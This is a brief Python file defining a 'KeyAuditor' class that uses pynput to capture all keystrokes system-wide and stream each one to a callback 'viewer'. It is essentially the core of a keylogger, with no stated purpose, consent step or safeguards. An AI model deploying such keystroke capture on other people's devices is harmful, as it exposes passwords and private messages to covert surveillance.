import threading
import time
from pynput import keyboard

class KeyAuditor:
    def __init__(self, callback_func):
        """
        callback_func: Function to call when a key is pressed. 
        Signature: callback(keystring)
        """
        self.callback = callback_func
        self.listener = None
        self.log_file = "session_log.txt"

    def start(self):
        if self.listener:
            try:
                self.listener.stop()
            except:
                pass
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print("[+] Key Auditor Started")

    def stop(self):
        if self.listener:
            self.listener.stop()

    def on_press(self, key):
        try:
            # Handle Alphanumeric
            k_str = key.char
        except AttributeError:
            # Handle Special Keys
            k_str = f"[{key.name}]"
        
        # Stream to Viewer
        if self.callback:
            self.callback(k_str)
